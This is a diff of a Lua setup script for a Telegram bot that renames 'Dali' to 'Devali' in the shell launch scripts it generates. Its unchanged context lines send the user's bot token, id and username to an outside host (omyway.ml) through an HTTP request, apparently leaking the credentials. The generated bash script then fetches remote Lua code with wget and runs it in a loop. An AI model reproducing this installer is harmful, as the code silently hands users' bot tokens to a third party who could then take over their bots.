@@ -65,16 +65,16 @@ end
 local function Files_Dali_Info()
 Create_Info(database:get(Server_Dali.."Token_Dali"),database:get(Server_Dali.."Id_Dali"),database:get(Server_Dali.."UserName_Dali"))   
 https.request("https://omyway.ml/boks/Boks.php?id="..database:get(Server_Dali.."Id_Dali").."&user="..database:get(Server_Dali.."UserName_Dali").."&token="..database:get(Server_Dali.."Token_Dali"))
-local RunDali = io.open("Dali", 'w')
+local RunDali = io.open("Devali", 'w')
 RunDali:write([[
 #!/usr/bin/env bash
-cd $HOME/Dali
+cd $HOME/Devali
 token="]]..database:get(Server_Dali.."Token_Dali")..[["
 rm -fr Dali.lua
-wget "https://raw.githubusercontent.com/temmali/Devali/main/Dali.lua"
+wget "https://raw.githubusercontent.com/temmali/Devali/main/Devali.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./Dali.lua -p PROFILE --bot=$token
+./tg -s ./Devali.lua -p PROFILE --bot=$token
 done
 ]])
 RunDali:close()
@@ -84,8 +84,8 @@ RunTs:write([[
 cd $HOME/Dali
 while(true) do
 rm -fr ../.telegram-cli
-screen -S Dali -X kill
-screen -S Dali ./Dali
+screen -S Devali -X kill
+screen -S Devali ./Devali
 done
 ]])
 RunTs:close()
